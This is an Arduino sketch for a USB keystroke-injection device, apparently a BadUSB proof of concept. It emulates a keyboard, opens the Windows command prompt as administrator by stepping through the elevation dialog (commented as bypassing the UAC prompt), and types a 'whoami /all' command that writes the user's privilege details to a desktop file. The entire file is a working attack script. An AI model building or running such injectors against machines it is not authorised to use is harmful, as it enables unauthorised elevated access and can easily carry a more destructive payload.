#include <Keyboard.h>
void setup() {//init
  Keyboard.begin();//Start keyboard communication 
  delay(3000);//Delay
  Keyboard.press(KEY_LEFT_GUI);//win Button
  delay(500);
  Keyboard.release(KEY_LEFT_GUI);
  delay(500);
  Keyboard.println("cmd"); //search for cmd
  delay(500); 
  //select run as admin and bypass UAC prompt
  Keyboard.press(KEY_RIGHT_ARROW);
  delay(50);
  Keyboard.release(KEY_RIGHT_ARROW);
  delay(50);
  Keyboard.press(KEY_DOWN_ARROW);
  delay(50);
  Keyboard.release(KEY_DOWN_ARROW);
  delay(50);
  Keyboard.press(KEY_RETURN);
  delay(50);
  Keyboard.release(KEY_RETURN);
  delay(500);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(50);
  Keyboard.release(KEY_LEFT_ARROW);
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(500);
  Keyboard.println("whoami /all > c:\\Users\\%username%\\Desktop\\lily.txt&exit"); //write command and press enter
  Keyboard.end();
}
void loop()
{
}
